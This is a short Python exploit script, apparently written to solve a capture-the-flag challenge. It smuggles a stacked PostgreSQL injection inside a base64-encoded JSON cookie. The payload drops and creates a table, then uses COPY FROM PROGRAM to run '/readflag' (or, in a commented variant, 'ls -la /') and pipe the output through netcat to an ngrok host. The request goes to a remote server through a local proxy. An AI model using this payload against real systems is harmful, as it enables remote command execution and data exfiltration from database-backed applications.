#!/usr/bin/env python3

import requests
import base64
import json
import datetime

proxies = {"http": "http://192.168.1.118:8080"}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337",
    "Accept": "*/*",
    "Connection": "keep-alive",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Cookie": "__cflb=$$UUID$$; __cfuid=$$RECV$$",
}

cfuid = {"id": "136); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '/readflag | nc 0.tcp.ap.ngrok.io 10192'; --", "output": base64.b64encode(b"HAXXOR STUFF").decode("ascii")}
# cfuid = {"id": "135); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'ls -la / | nc 0.tcp.ap.ngrok.io 12440'; --", "output": base64.b64encode(b"HAXXOR STUFF").decode("ascii")}

b64 = base64.b64encode(
    bytes(
        json.dumps(cfuid),
        "ascii",
    )
).decode("ascii")

headers["Cookie"] = f"__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid={b64}"
response = requests.post(
    "http://159.65.81.48:32568/assets/jquery-3.6.0.slim.min.js",
    headers=headers
)
